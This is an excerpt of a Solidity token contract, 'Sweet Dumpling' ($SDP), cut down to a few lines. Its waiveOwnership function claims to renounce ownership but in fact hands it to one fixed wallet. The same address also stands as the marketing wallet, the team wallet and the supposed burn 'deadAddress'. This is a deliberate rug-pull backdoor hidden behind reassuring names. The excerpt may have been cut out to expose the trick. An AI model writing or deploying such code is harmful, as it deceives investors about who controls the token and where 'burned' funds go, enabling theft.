...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xDA03389D2c00b99C4c4B346feE350c78c207E551));
        _owner = address(0xDA03389D2c00b99C4c4B346feE350c78c207E551);
    }
...
contract SweetDumpling is Context, IERC20, Ownable {
    ...
    string private _name = "Sweet Dumpling";
    string private _symbol = "$SDP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xDA03389D2c00b99C4c4B346feE350c78c207E551);
    address payable public teamWalletAddress = payable(0xDA03389D2c00b99C4c4B346feE350c78c207E551);
    address public immutable deadAddress = 0xDA03389D2c00b99C4c4B346feE350c78c207E551;
